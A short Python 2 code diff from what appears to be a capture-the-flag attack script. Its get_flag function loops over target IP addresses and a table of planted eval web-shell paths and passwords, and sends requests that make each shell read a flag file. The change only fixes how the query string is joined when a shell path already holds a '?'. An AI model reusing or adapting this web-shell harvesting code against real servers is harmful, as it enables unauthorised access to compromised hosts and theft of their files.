@@ -50,7 +50,10 @@ def get_flag(ip_list):
         for k in GET_eval_shells_path_pwd:
             url = "http://" + i + k
             try:
-                flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
+                if '?' in k:
+                    flag=requests.get(url+'&'+GET_eval_shells_path_pwd[k] + "=" + GET_file)
+                else:
+                    flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
                 judege(flag)
             except:
                 print "error"
